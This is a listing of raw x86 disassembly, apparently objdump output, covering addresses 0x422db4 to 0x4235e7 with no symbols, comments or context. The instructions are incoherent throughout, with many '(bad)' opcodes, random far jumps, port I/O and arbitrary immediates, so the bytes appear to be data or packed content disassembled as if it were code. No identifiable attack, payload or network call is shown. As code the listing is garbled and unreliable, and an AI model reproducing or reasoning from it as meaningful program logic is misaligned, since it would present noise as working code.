  422db4:	xchg   eax,esi
  422db6:	fiadd  DWORD PTR [esi-0x58]
  422db9:	popa   
  422dba:	add    BYTE PTR [esi+0x49],ch
  422dbd:	xor    eax,0x317014f7
  422dc2:	lahf   
  422dc3:	fsub   DWORD PTR ds:0x76df
  422dc8:	jmp    0xa8bd4d42
  422dcd:	mov    al,0xe3
  422dcf:	enter  0x20fb,0x2e
  422dd3:	neg    ecx
  422dd5:	mov    edi,0x178e64d0
  422dda:	(bad)  
  422ddb:	mov    ecx,0xa75bc0b3
  422de0:	push   es
  422de1:	mov    esp,0x35c6bc7a
  422de6:	lock or al,0xc
  422de9:	sbb    al,0xb4
  422deb:	test   BYTE PTR [ebx],bh
  422ded:	jae    0x422e5c
  422def:	lods   al,BYTE PTR ds:[esi]
  422df0:	(bad)  
  422df1:	rol    DWORD PTR [ebx],1
  422df3:	push   eax
  422df4:	sbb    bl,ah
  422df6:	pop    edi
  422df7:	shl    DWORD PTR [esi+0x32484f58],cl
  422dfd:	int    0xd8
  422dff:	pop    ss
  422e00:	xchg   edx,eax
  422e01:	add    DWORD PTR [edx+0x19060b2e],ebp
  422e07:	mov    ds:0xa194011b,eax
  422e0c:	xor    ebx,DWORD PTR ds:0xc9b123af
  422e12:	cld    
  422e13:	mov    ah,0x3c
  422e15:	ss pop ebp
  422e17:	pop    esi
  422e18:	aas    
  422e19:	arpl   WORD PTR [eax-0x1e],bx
  422e1c:	data16 sbb dh,BYTE PTR [edx+0x41]
  422e20:	jae    0x422df7
  422e22:	mov    esi,0xfab3edbd
  422e27:	adc    eax,0xcaf471
  422e2c:	ror    DWORD PTR [ecx],cl
  422e2e:	inc    eax
  422e2f:	mov    ch,0x2f
  422e31:	push   ecx
  422e32:	sti    
  422e33:	lods   al,BYTE PTR ds:[esi]
  422e34:	mov    ebp,DWORD PTR [eax+0x74451ddf]
  422e3a:	out    0xac,eax
  422e3c:	mov    esi,0x1c735f36
  422e41:	(bad)
  422e45:	jg     0x422e6d
  422e47:	lods   eax,DWORD PTR ds:[esi]
  422e48:	test   eax,0xbf42164b
  422e4d:	inc    BYTE PTR [eax]
	...
  422e57:	add    BYTE PTR [eax],al
  422e59:	add    cl,bh
  422e5b:	std    
  422e5c:	in     eax,dx
  422e5d:	mov    cl,0xed
  422e5f:	mov    cl,0xfd
  422e61:	std    
  422e62:	cmp    bl,BYTE PTR [edi-0x309d013c]
  422e68:	idiv   esi
  422e6a:	mov    esp,0xfc0001a8
  422e6f:	add    DWORD PTR [eax],eax
  422e71:	add    BYTE PTR [ecx-0x625f2f3e],bl
  422e77:	adc    esi,DWORD PTR [esi+edx*1+0x17]
  422e7b:	or     BYTE PTR [ecx],0x56
  422e7e:	or     eax,DWORD PTR [edi-0x1149c68c]
  422e84:	lds    ebx,FWORD PTR [eax]
  422e86:	and    al,0xf8
  422e88:	scas   eax,DWORD PTR es:[edi]
  422e89:	mov    ?,WORD PTR ds:0x549a23fc
  422e8f:	mov    ds:0x5cb3e2ef,al
  422e94:	sar    ecx,1
  422e96:	sub    BYTE PTR [edx],ch
  422e98:	mov    ah,0x73
  422e9a:	push   edx
  422e9b:	mov    ebp,0xe90e5ce2
  422ea0:	fsubr  st(6),st
  422ea2:	pop    ds
  422ea3:	ss pop edx
  422ea5:	cwde   
  422ea6:	xchg   esp,eax
  422ea7:	jb     0x422ef1
  422ea9:	jl     0x422e98
  422eab:	shl    bh,1
  422ead:	xchg   DWORD PTR [esi-0x57],eax
  422eb0:	push   0x5a
  422eb2:	repz test al,0xb5
  422eb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422eb6:	cmp    bl,BYTE PTR [esi+0xb]
  422eb9:	inc    esp
  422eba:	cmc    
  422ebb:	cmp    al,0x5c
  422ebd:	sbb    eax,0xb081b325
  422ec2:	mov    ah,0x7a
  422ec4:	inc    eax
  422ec5:	shr    esp,cl
  422ec7:	rcl    BYTE PTR [eax-0x2616ad1d],cl
  422ecd:	add    al,0xa1
  422ecf:	enter  0x971d,0x1e
  422ed3:	fcom   QWORD PTR [edx-0x37]
  422ed6:	minps  xmm2,XMMWORD PTR [ebx+0x32]
  422eda:	mov    ah,al
  422edc:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  422ede:	in     al,dx
  422edf:	test   al,0x7c
  422ee1:	or     eax,0x7031a102
  422ee6:	cmp    DWORD PTR [ecx+0x57f02d95],edx
  422eec:	mov    ds:0x19e5d310,al
  422ef1:	iret   
  422ef2:	push   0x720ffcf5
  422ef7:	ins    BYTE PTR es:[edi],dx
  422ef8:	push   es
  422ef9:	retf   
  422efa:	and    DWORD PTR [ecx-0x6d808e4b],esp
  422f00:	xchg   esi,eax
  422f01:	jb     0x422ea3
  422f03:	mov    ds:0x6e47ff9,al
  422f08:	mov    bl,BYTE PTR [ebx+0x6d]
  422f0b:	mov    dh,0x90
  422f0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f0e:	sahf   
  422f0f:	in     al,0xe
  422f11:	ss inc edx
  422f13:	sub    dh,BYTE PTR [ebx+0x650d3b6d]
  422f19:	mov    dl,0xcc
  422f1b:	mov    ecx,edx
  422f1d:	bound  ecx,QWORD PTR es:[ebx+0x5d]
  422f21:	ficomp WORD PTR [eax+esi*1+0x62]
  422f25:	cdq    
  422f26:	adc    ecx,DWORD PTR [esi]
  422f28:	sub    BYTE PTR [eax+0x38f38653],dl
  422f2e:	sbb    ebp,edi
  422f30:	jmp    0x4870e2b7
  422f35:	or     bh,BYTE PTR [edi*1+0x19812001]
  422f3c:	test   BYTE PTR [ecx+0x33],cl
  422f3f:	imul   esp,DWORD PTR [esi-0x26],0xf8645de6
  422f46:	loop   0x422f60
  422f48:	dec    esp
  422f49:	mov    dl,0x1e
  422f4b:	inc    ecx
  422f4c:	fist   DWORD PTR [esi-0x7692b7cf]
  422f52:	into   
  422f53:	jmp    0x422f59
  422f55:	in     al,0x56
  422f57:	jo     0xf9358ff8
  422f5d:	sub    ebx,DWORD PTR [esp+ebp*4+0x858cae]
  422f64:	or     eax,0x4f5f952
  422f69:	pop    ss
  422f6a:	das    
  422f6b:	shl    BYTE PTR [ebx-0x42cf1809],cl
  422f71:	adc    bh,al
  422f73:	or     bh,ch
  422f75:	lock dec edi
  422f77:	adc    al,0xd8
  422f79:	(bad)  
  422f7a:	mov    ebx,0xd0a5c105
  422f7f:	mov    ds:0xab3b69f,al
  422f84:	adc    al,0x93
  422f86:	xor    al,0xc0
  422f88:	stos   DWORD PTR es:[edi],eax
  422f89:	sahf   
  422f8a:	sbb    BYTE PTR [esp+ebp*8],ah
  422f8d:	setno  al
  422f90:	pop    ss
  422f91:	setb   BYTE PTR [edi-0x7b8d80e6]
  422f98:	int    0x73
  422f9a:	inc    BYTE PTR [esi-0x36]
  422f9d:	shl    cl,0xce
  422fa0:	sbb    eax,0x1a880c15
  422fa5:	dec    edi
  422fa6:	ffreep st(0)
  422fa8:	imul   eax,DWORD PTR [ebp-0x6b216867],0xffffff89
  422faf:	das    
  422fb0:	push   eax
  422fb1:	jge    0x422f5c
  422fb3:	mov    al,0x3f
  422fb5:	std    
  422fb6:	mov    esp,0x236bb0d8
  422fbb:	jo     0x422f95
  422fbd:	or     al,0xfa
  422fbf:	mov    ebx,0x37637919
  422fc4:	pop    DWORD PTR [ebx]
  422fc6:	jp     0x422ff5
  422fc8:	sub    al,BYTE PTR [eax-0x65]
  422fcb:	ja     0x423017
  422fcd:	jmp    0x422f95
  422fcf:	push   es
  422fd0:	jg     0x422fcd
  422fd2:	sub    DWORD PTR [ecx],0xe2fd0cc7
  422fd8:	loope  0x422f6b
  422fda:	add    cl,BYTE PTR [eax-0x65]
  422fdd:	push   0x46c481c9
  422fe2:	pop    eax
  422fe3:	imul   esp,DWORD PTR [ebx-0x57],0x71
  422fe7:	add    eax,0xaf7f5d54
  422fec:	inc    ebp
  422fed:	xchg   ebp,eax
  422fee:	fwait
  422fef:	scas   eax,DWORD PTR es:[edi]
  422ff0:	fld    DWORD PTR [eax]
  422ff2:	mov    cl,0x44
  422ff4:	push   ebx
  422ff5:	dec    esp
  422ff6:	dec    ebx
  422ff7:	sbb    esi,DWORD PTR [ecx+0x148cbeb8]
  422ffd:	add    eax,0xa43285a1
  423002:	mov    dl,0x52
  423004:	jno    0x42305b
  423006:	or     dl,BYTE PTR [ecx-0x7e]
  423009:	mov    al,ds:0x85c2f609
  42300e:	push   edx
  42300f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423011:	in     al,dx
  423012:	jmp    0xf771:0x2d9b8c2d
  423019:	xchg   ecx,eax
  42301a:	pop    ds
  42301b:	bound  ebp,QWORD PTR [edi+edi*4-0x46]
  42301f:	push   ds
  423020:	lahf   
  423021:	inc    esp
  423022:	push   0xffffff80
  423024:	iret   
  423025:	int    0xc7
  423027:	test   DWORD PTR [edi+0x15],esi
  42302a:	imul   ebp,eax,0xb0ec27af
  423030:	adc    cl,BYTE PTR [ebp-0x14d0847]
  423036:	sti    
  423037:	scas   eax,DWORD PTR es:[edi]
  423038:	jge    0x423085
  42303a:	retf   0x8f33
  42303d:	or     eax,0x46927ae6
  423042:	or     eax,0x50b279bd
  423047:	aas    
  423048:	or     al,0x11
  42304a:	inc    ebx
  42304b:	sub    dl,BYTE PTR [eax]
  42304d:	(bad)  
  42304e:	and    al,0xa0
  423050:	mov    ds:0xfb3f653b,al
  423055:	jmp    0x64b44c83
  42305a:	mov    al,0xf4
  42305c:	mov    eax,0xf2d24e6a
  423061:	sahf   
  423062:	pusha  
  423063:	or     al,0x4a
  423065:	sahf   
  423066:	xchg   ebx,eax
  423067:	xchg   edx,ebp
  423069:	cs sbb DWORD PTR cs:[ebx+0xdb],edi
	...
  423079:	add    dl,dh
  42307b:	rol    BYTE PTR ds:0xf6d53751,0xe3
  423082:	test   BYTE PTR [eax],0xec
  423085:	inc    esi
  423086:	sub    eax,0xb8145062
  42308b:	stos   BYTE PTR es:[edi],al
  42308c:	add    DWORD PTR [eax],eax
  42308e:	cld    
  42308f:	add    DWORD PTR [eax],eax
  423091:	add    bl,bh
  423093:	mov    ah,0xa5
  423095:	mov    ah,0xe6
  423097:	fidiv  WORD PTR [ebp+0x7e07e6c2]
  42309d:	inc    esi
  42309e:	pushf  
  42309f:	fild   QWORD PTR [esi-0x149b921b]
  4230a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230a6:	mov    ecx,0xba0c5ba
  4230ab:	inc    ebx
  4230ac:	cmp    BYTE PTR [ebp+0x57],bh
  4230af:	and    eax,0x4347bac5
  4230b4:	test   al,0x2d
  4230b6:	lea    eax,[edx+eax*8-0x5350546c]
  4230bd:	dec    eax
  4230be:	dec    edx
  4230bf:	nop
  4230c0:	test   al,0x41
  4230c2:	mov    eax,ds:0x8b53a79b
  4230c7:	(bad)  
  4230c8:	stc    
  4230c9:	scas   al,BYTE PTR es:[edi]
  4230ca:	fisttp DWORD PTR ds:0x644123e9
  4230d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230d1:	stos   BYTE PTR es:[edi],al
  4230d2:	mov    ds:0x490c8617,eax
  4230d7:	mov    bh,bl
  4230d9:	jbe    0x423130
  4230db:	and    BYTE PTR [edx-0x6a],bh
  4230de:	out    0x26,al
  4230e0:	cli    
  4230e1:	(bad)  
  4230e3:	scas   eax,DWORD PTR es:[edi]
  4230e4:	pop    edx
  4230e5:	test   eax,0x24806030
  4230ea:	mov    dl,0x5c
  4230ec:	mov    al,0xaf
  4230ee:	lods   al,BYTE PTR ds:[esi]
  4230ef:	add    eax,DWORD PTR [ecx-0x69]
  4230f2:	cdq    
  4230f3:	fcom   DWORD PTR [ecx+eax*2-0x5dc4d5f2]
  4230fa:	mov    BYTE PTR [ebp+0x4b8029e],cl
  423100:	or     BYTE PTR [edi],dh
  423102:	test   al,0xfe
  423104:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423105:	aaa    
  423106:	sub    al,0x22
  423109:	in     eax,dx
  42310a:	xchg   DWORD PTR [edx-0x7c2402ae],edi
  423110:	imul   eax,DWORD PTR [eax+0x47],0xaec77b62
  423117:	cmp    DWORD PTR [ebx+0x6ebbded],esp
  42311d:	hlt    
  42311e:	push   0x70106825
  423123:	mov    esi,0xa24f598
  423128:	js     0x423172
  42312a:	xor    bh,BYTE PTR ds:0x8bba6cbf
  423130:	inc    ecx
  423131:	push   ebx
  423132:	xor    dh,bl
  423134:	ds inc edi
  423136:	sub    ebx,eax
  423138:	cli    
  423139:	xor    BYTE PTR ds:0x6a5dc216,cl
  42313f:	and    eax,0xd8975f03
  423144:	arpl   bp,si
  423146:	mov    DWORD PTR [esi+eax*8-0x1d3668c9],edi
  42314d:	mov    cl,0x44
  42314f:	jg     0x4230d2
  423151:	push   edx
  423152:	xor    ecx,DWORD PTR [edx+0x64]
  423155:	hlt    
  423156:	mov    eax,ds:0xd311bee1
  42315b:	in     al,0xd2
  42315d:	xor    ecx,edx
  42315f:	xor    al,0xac
  423161:	leave  
  423162:	dec    edi
  423163:	sub    edi,0xbefd23f0
  423169:	fxam   
  42316b:	dec    ebp
  42316c:	push   cs
  42316d:	(bad)  
  42316e:	jge    0x4230f7
  423170:	jne    0x42318d
  423172:	jnp    0x4230f8
  423174:	aad    0x4
  423176:	and    al,0xd5
  423178:	sbb    BYTE PTR [edi+0x2e],0x2b
  42317c:	stos   DWORD PTR es:[edi],eax
  42317d:	pop    ecx
  42317e:	aaa    
  42317f:	sti    
  423180:	cmp    ecx,eax
  423182:	aam    0x73
  423184:	in     eax,0x69
  423186:	outs   dx,DWORD PTR ds:[esi]
  423187:	(bad)  
  423188:	(bad)  
  423189:	xor    al,0x58
  42318b:	ret    
  42318c:	out    0xd4,eax
  42318e:	pop    esp
  42318f:	xor    al,0x64
  423191:	lds    esi,FWORD PTR [ebp-0x71c18fb3]
  423197:	(bad)  [ecx+edi*2+0x16]
  42319b:	fadd   QWORD PTR [edx+ecx*2-0x5b]
  42319f:	idiv   DWORD PTR [ebp+edx*4+0x25d29023]
  4231a6:	leave  
  4231a7:	test   esp,ebp
  4231a9:	(bad)  
  4231aa:	scas   eax,DWORD PTR es:[edi]
  4231ab:	xchg   edi,eax
  4231ac:	(bad)  [edi+esi*2-0x42570b45]
  4231b3:	add    DWORD PTR [ecx+0x7de95119],edx
  4231b9:	jecxz  0x423197
  4231bb:	ret    0x56b2
  4231be:	sbb    eax,0xf81bafc6
  4231c3:	sti    
  4231c4:	xchg   ecx,eax
  4231c5:	fwait
  4231c6:	xchg   BYTE PTR [edx],dh
  4231c8:	inc    ebp
  4231c9:	test   DWORD PTR [eax+0x2d0312b7],ebx
  4231cf:	imul   edx,ebp,0xeaa7281b
  4231d5:	or     eax,0x6b8c841f
  4231da:	pop    ds
  4231db:	call   0xd89e:0x2e8709ab
  4231e2:	inc    ebp
  4231e3:	adc    ah,BYTE PTR [eax]
  4231e5:	inc    ebx
  4231e6:	push   esi
  4231e7:	jne    0x423217
  4231e9:	les    esp,FWORD PTR [eax+0x28]
  4231ec:	mov    BYTE PTR [esi-0x371da9c3],al
  4231f2:	(bad)  
  4231f3:	jmp    FWORD PTR [ecx]
  4231f5:	xor    ah,BYTE PTR [eax]
  4231f7:	mov    edx,0x5101e773
  4231fc:	cmp    al,0x68
  4231fe:	fnstsw WORD PTR ds:0xf70cd2b9
  423204:	xor    eax,0x547decfe
  423209:	jmp    0x85b08ee4
  42320e:	fwait
  42320f:	or     eax,0x7c5104ec
  423214:	in     al,dx
  423215:	and    DWORD PTR [ecx],esi
  423217:	dec    esi
  423218:	mov    edx,0x2d1df7eb
  42321d:	xchg   esi,eax
  42321e:	push   0x7
  423220:	push   ebx
  423221:	mov    al,ds:0xa379c92a
  423226:	int3   
  423227:	arpl   WORD PTR [edi],di
  423229:	push   ecx
  42322a:	out    0x4b,eax
  42322c:	les    edi,FWORD PTR [ebx+0x76250c1e]
  423232:	mov    dh,0xf5
  423234:	sub    ch,BYTE PTR [esi+0x61]
  423237:	cmp    DWORD PTR [edx+0x4],esp
  42323a:	imul   edx,DWORD PTR [ebx],0x18
  42323d:	jg     0x42323d
  42323f:	(bad)  
  423240:	sbb    al,0x6e
  423242:	push   esi
  423243:	pop    esi
  423244:	mov    ebp,0x4fdfb891
  423249:	jmp    0x2f03:0xe5298333
  423250:	mov    esi,0xf3c057c7
  423255:	add    al,0x2d
  423257:	cmp    esi,DWORD PTR [ebp-0x30fdaf2c]
  42325d:	xchg   ebp,eax
  42325e:	les    eax,FWORD PTR [ecx+0x16de0b76]
  423264:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  423266:	push   esp
  423267:	stos   BYTE PTR es:[edi],al
  423268:	lds    edx,FWORD PTR [ecx]
  42326a:	fdivr  DWORD PTR [ecx+0x5e668fa4]
  423270:	mov    ebx,0x2e0c6a63
  423275:	mov    eax,0x282bbcae
  42327a:	and    al,dh
  42327c:	inc    edi
  42327d:	mov    al,0x4c
  42327f:	test   BYTE PTR [edi+0x15cc02f5],bh
  423285:	mov    eax,0x269ba622
  42328a:	dec    edx
  42328b:	xor    eax,0x4da4
	...
  423298:	add    BYTE PTR [eax],al
  42329a:	inc    ebx
  42329b:	inc    ecx
  42329c:	popa   
  42329d:	data16 arpl WORD PTR [esi+0x47],sp
  4232a1:	gs push cs
  4232a3:	mov    BYTE PTR [edi-0x37],bh
  4232a6:	mov    ah,0xe9
  4232a8:	xor    al,0x44
  4232aa:	mov    ah,0xac
  4232ac:	add    DWORD PTR [eax],eax
  4232ae:	cld    
  4232af:	add    DWORD PTR [eax],eax
  4232b1:	add    BYTE PTR [ebx+0x75],bh
  4232b4:	jbe    0x42327c
  4232b6:	enter  0x683b,0xa9
  4232ba:	mov    bl,0x5e
  4232bc:	inc    edi
  4232bd:	cmp    BYTE PTR ds:0xaa3297c8,ah
  4232c3:	dec    ebx
  4232c4:	cwde   
  4232c5:	add    eax,0x58521f8c
  4232ca:	outs   dx,DWORD PTR ds:[esi]
  4232cb:	dec    eax
  4232cc:	push   esp
  4232cd:	lock fsubr st,st(0)
  4232d0:	xchg   esp,eax
  4232d1:	or     edi,0xf0fd5bd1
  4232d7:	pop    esi
  4232d8:	enter  0xd427,0x5c
  4232dc:	imul   edi,DWORD PTR [ecx-0x70],0x12
  4232e0:	push   0x60
  4232e2:	fstp   TBYTE PTR [edi]
  4232e4:	retf   0xe5b5
  4232e7:	sti    
  4232e8:	repz pop edx
  4232ea:	push   DWORD PTR [ebx+0x39]
  4232ed:	ja     0x423288
  4232ef:	mov    dh,0xfe
  4232f1:	ficomp DWORD PTR [eax+0x35]
  4232f4:	data16 out dx,al
  4232f6:	addr16 pusha 
  4232f8:	leave  
  4232f9:	out    dx,al
  4232fa:	bound  ecx,QWORD PTR [esi-0x4f]
  4232fd:	jo     0x42333d
  4232ff:	sub    al,0xad
  423301:	nop
  423302:	cmp    DWORD PTR [ebx+0x2ee5f6e4],ebp
  423308:	or     eax,DWORD PTR [esi+eax*1-0x80]
  42330c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42330d:	das    
  42330e:	push   ss
  42330f:	and    BYTE PTR [ebp+0xc],ch
  423312:	les    ecx,FWORD PTR [ecx+0x8]
  423315:	xchg   ebp,eax
  423316:	push   eax
  423317:	pushf  
  423318:	add    al,0x63
  42331a:	cmp    al,0xfd
  42331c:	(bad)  
  42331d:	call   0x677f:0x99b1a175
  423324:	sub    BYTE PTR [ebp-0x6bead6a9],0x67
  42332b:	pinsrw mm2,WORD PTR [eax],0x92
  42332f:	inc    esp
  423330:	push   esi
  423331:	jle    0x4232d9
  423333:	div    BYTE PTR ds:0xed3c4bac
  423339:	(bad)  
  42333a:	mov    ecx,0x531c6f1f
  42333f:	arpl   WORD PTR [eax],di
  423341:	jl     0x423306
  423343:	push   edi
  423344:	(bad)  
  423345:	in     al,0x37
  423347:	out    0x94,al
  423349:	push   cs
  42334a:	push   edx
  42334b:	sbb    DWORD PTR [esi],eax
  42334d:	mov    dh,0xe1
  42334f:	adc    ah,BYTE PTR [edx+0x6f242392]
  423355:	clc    
  423356:	adc    dh,BYTE PTR [eax-0x1d]
  423359:	mov    al,0x24
  42335b:	clc    
  42335c:	daa    
  42335d:	test   BYTE PTR [edi+0x7d],0xa1
  423361:	xor    BYTE PTR [eax],ch
  423363:	or     DWORD PTR [ecx+0x23],eax
  423366:	push   edx
  423367:	jle    0x42330b
  423369:	rol    DWORD PTR [ebx+eax*8-0x1d],0x97
  42336e:	mov    ah,0x4a
  423370:	dec    esp
  423371:	out    0x6,eax
  423373:	or     BYTE PTR [ebx],0x6e
  423376:	(bad)  
  423377:	sbb    ch,BYTE PTR [ecx]
  423379:	test   al,0x16
  42337b:	push   ecx
  42337c:	dec    edx
  42337d:	mov    ebp,0x8339d12d
  423382:	addr16 out dx,al
  423384:	cs mov dh,0x23
  423387:	ror    DWORD PTR [ebx+0x339f0764],1
  42338d:	adc    DWORD PTR [ecx-0xf981993],ebp
  423393:	in     eax,dx
  423394:	adc    dl,bl
  423396:	outs   dx,BYTE PTR ds:[esi]
  423397:	jg     0x423390
  423399:	jae    0x423335
  42339b:	ss pushf 
  42339d:	retf   
  42339e:	push   edx
  42339f:	bound  edi,QWORD PTR [ebx]
  4233a1:	adc    DWORD PTR [ecx],edx
  4233a3:	fmul   QWORD PTR ds:[eax+0x7499d326]
  4233aa:	cmp    BYTE PTR ds:0xfefaf332,ah
  4233b0:	sub    esp,eax
  4233b2:	and    DWORD PTR [ebp-0x4e1e5f73],0x18ce72b8
  4233bc:	push   cs
  4233bd:	shld   edx,esp,cl
  4233c0:	stos   DWORD PTR es:[edi],eax
  4233c1:	repnz pop ebp
  4233c3:	mov    bh,BYTE PTR [edx]
  4233c5:	xor    esi,DWORD PTR [eax+0x32]
  4233c8:	xchg   BYTE PTR [edx+edx*8+0x62],cl
  4233cc:	iret   
  4233cd:	cwde   
  4233ce:	mov    ds:0x6f5e801e,al
  4233d3:	mov    edi,0x105b8f6c
  4233d8:	or     DWORD PTR [edi-0x75],edi
  4233db:	pop    ds
  4233dc:	jge    0x423371
  4233de:	or     eax,DWORD PTR [eax+0x1]
  4233e1:	add    al,0x64
  4233e3:	xor    eax,0xb7bd000e
  4233e8:	sbb    bh,BYTE PTR [ecx]
  4233ea:	push   ecx
  4233eb:	jp     0x423460
  4233ed:	mov    dl,0x64
  4233ef:	and    ch,cl
  4233f1:	lock sbb edx,DWORD PTR [edx-0x2150e9b8]
  4233f8:	je     0x423448
  4233fa:	and    DWORD PTR [edx+0x1ec80b9f],ecx
  423400:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423401:	data16 or al,0x1e
  423404:	stc    
  423405:	sbb    DWORD PTR [ebx+esi*2],0x29476656
  42340c:	into   
  42340d:	popa   
  42340e:	mov    ds:0x9f34bbb,al
  423413:	pop    ecx
  423414:	ja     0x4233e4
  423416:	push   edx
  423417:	mov    ds:0x83e6a0fc,al
  42341c:	rol    edx,1
  42341e:	sub    al,0x93
  423420:	je     0x42342a
  423422:	sub    ah,BYTE PTR [edx]
  423424:	add    al,0xfb
  423426:	cmp    BYTE PTR [edx+0x78dd368c],al
  42342c:	cwde   
  42342d:	repnz push eax
  42342f:	push   edx
  423430:	cmp    bl,dh
  423432:	jmp    0x430dcdae
  423437:	loopne 0x4233f1
  423439:	sub    DWORD PTR [edi+0x74c09513],ebp
  42343f:	(bad)  
  423440:	sub    BYTE PTR [ebx-0x6e40f486],bl
  423446:	dec    ebp
  423447:	test   BYTE PTR [esi],ch
  423449:	data16 loop 0x4233ce
  42344c:	mov    ?,WORD PTR [edi-0x6e]
  42344f:	jge    0x42343b
  423451:	push   esi
  423452:	mov    al,0x30
  423454:	jg     0x42344b
  423456:	test   eax,0x4ccf846e
  42345b:	in     al,0xd6
  42345d:	adc    eax,0xc9017627
  423462:	std    
  423463:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423464:	cmp    ch,BYTE PTR [eax-0x77]
  423467:	cmp    al,BYTE PTR [ebp-0x746ff351]
  42346d:	xchg   edx,eax
  42346e:	dec    esi
  42346f:	xchg   ebp,eax
  423470:	inc    edi
  423471:	inc    ebp
  423472:	inc    esi
  423473:	push   esp
  423474:	daa    
  423475:	pop    ecx
  423476:	(bad)  
  423477:	aas    
  423478:	or     dh,BYTE PTR [ebx+0x67]
  42347b:	enter  0x9d1a,0xe4
  42347f:	pop    esp
  423480:	test   DWORD PTR [esi+0x4b928e10],esp
  423486:	sbb    al,0x83
  423488:	ror    DWORD PTR [ebx+0x7a],1
  42348b:	fcom   QWORD PTR [esp+ecx*2-0x1b10b0a3]
  423492:	(bad)  
  423493:	in     eax,dx
  423494:	call   0x85f09b35
  423499:	popf   
  42349a:	into   
  42349b:	xchg   edi,eax
  42349c:	pop    ds
  42349d:	add    al,0x24
  42349f:	loop   0x423442
  4234a1:	mov    al,ds:0x7efcf709
  4234a6:	and    esi,eax
  4234a8:	adc    al,0xf3
  4234aa:	leave  
  4234ab:	mov    ch,0x44
  4234ad:	inc    ecx
	...
  4234ba:	mov    ebp,edx
  4234bc:	rcr    DWORD PTR [ebx],cl
  4234be:	repz cmp ecx,ebx
  4234c1:	cli    
  4234c2:	cmp    dh,bl
  4234c4:	adc    BYTE PTR [ebx],dl
  4234c6:	mov    BYTE PTR [ebp-0x514ffe9d],ch
  4234cc:	add    DWORD PTR [eax],eax
  4234ce:	cld    
  4234cf:	add    DWORD PTR [eax],eax
  4234d1:	add    BYTE PTR [eax+0x14],bh
  4234d4:	pop    eax
  4234d5:	in     eax,0x57
  4234d7:	push   ebp
  4234d8:	xor    dl,bl
  4234da:	aaa    
  4234db:	shl    DWORD PTR [edi+0x53],0xe6
  4234df:	popf   
  4234e0:	push   eax
  4234e1:	dec    ecx
  4234e2:	daa    
  4234e3:	xor    al,0x50
  4234e5:	cmc    
  4234e6:	and    eax,0xdd188bcd
  4234eb:	loope  0x4234ae
  4234ed:	mov    ss,esi
  4234ef:	ins    BYTE PTR es:[edi],dx
  4234f0:	xchg   DWORD PTR [eax+0x5836b582],ebp
  4234f6:	out    dx,al
  4234f7:	jmp    0x423555
  4234f9:	mov    bl,0x12
  4234fb:	fmul   DWORD PTR [edx+eiz*2+0x6c]
  4234ff:	sbb    al,0xcb
  423501:	imul   eax,DWORD PTR [eax+0x4662955a],0x21
  423508:	shr    BYTE PTR [eax+0x7f],1
  42350b:	cmc    
  42350c:	(bad)
  423511:	pop    es
  423512:	in     eax,0xe6
  423514:	cmp    ebx,DWORD PTR [edi+0x12]
  423517:	in     al,dx
  423518:	ins    DWORD PTR es:[edi],dx
  423519:	jmp    0x423570
  42351b:	mov    ebx,0x6726e874
  423520:	xchg   DWORD PTR [ecx+0x996aca2],ebx
  423526:	jg     0x4234e4
  423528:	sbb    al,0x67
  42352a:	xor    al,0x19
  42352c:	or     al,0xff
  42352e:	or     esp,ebx
  423530:	mov    dh,0xd2
  423532:	leave  
  423533:	out    dx,al
  423534:	div    edx
  423536:	cdq    
  423537:	pusha  
  423538:	shl    ecx,0x7c
  42353b:	pop    ss
  42353c:	jmp    0xe4b8:0xf2132984
  423543:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423544:	dec    eax
  423545:	mov    eax,ds:0xdc668ad5
  42354a:	pop    ebx
  42354b:	push   eax
  42354c:	xor    al,0xbf
  42354e:	inc    edi
  42354f:	iret   
  423550:	mov    edx,0xa300d8f4
  423555:	repnz sti 
  423557:	icebp  
  423558:	(bad)  
  423559:	mov    ch,0x31
  42355b:	inc    edi
  42355c:	mov    ebx,0x97c596d1
  423561:	out    dx,eax
  423562:	mov    ecx,0x858c41d5
  423567:	je     0x423566
  423569:	jbe    0x42350e
  42356b:	inc    edx
  42356c:	sar    ebp,1
  42356e:	in     eax,0x27
  423570:	cwde   
  423571:	mov    ds:0x5cfed1ba,eax
  423576:	fdiv   QWORD PTR [ebp+0x37]
  423579:	stos   DWORD PTR es:[di],eax
  42357b:	es inc ebp
  42357d:	shr    DWORD PTR [edx],0x27
  423580:	mov    esp,0x29612ee1
  423585:	imul   DWORD PTR [eax-0x42de19dc]
  42358b:	pop    ebx
  42358c:	loop   0x4235e2
  42358e:	pushf  
  42358f:	or     eax,0x1dc4c97f
  423594:	jmp    0x423599
  423596:	adc    BYTE PTR [edx+eax*2+0x72],0x36
  42359b:	js     0x4235f5
  42359d:	sbb    eax,DWORD PTR [edi-0xb]
  4235a0:	shr    DWORD PTR [edi],0x45
  4235a3:	add    DWORD PTR [edx+eax*2],0xffffffb6
  4235a7:	cmp    DWORD PTR [edx+0x25],esi
  4235aa:	loop   0x42355c
  4235ac:	dec    esp
  4235ad:	mov    eax,ds:0xef607e7e
  4235b2:	lods   al,BYTE PTR ds:[esi]
  4235b3:	xchg   ebx,eax
  4235b4:	test   bh,al
  4235b6:	sbb    dl,dh
  4235b8:	test   al,0x51
  4235ba:	and    bl,al
  4235bc:	(bad)  
  4235bd:	movaps xmm1,xmm5
  4235c0:	mov    edi,gs
  4235c2:	cmp    al,0x59
  4235c4:	into   
  4235c5:	sbb    DWORD PTR [esi],eax
  4235c7:	or     esi,DWORD PTR [eax+esi*1+0x1690807]
  4235ce:	inc    ecx
  4235cf:	push   es
  4235d0:	lea    ecx,ds:0xd23b2d53
  4235d6:	pop    ebx
  4235d7:	and    BYTE PTR [edi],0x28
  4235da:	cmc    
  4235db:	test   eax,0xc328eeed
  4235e0:	mov    dl,0x23
  4235e2:	xchg   edx,eax
  4235e3:	inc    eax
  4235e4:	xchg   edx,eax
  4235e5:	xchg   esp,eax
  4235e6:	push   ds
  4235e7:	ds es imul ebp,eax,0xffffff82
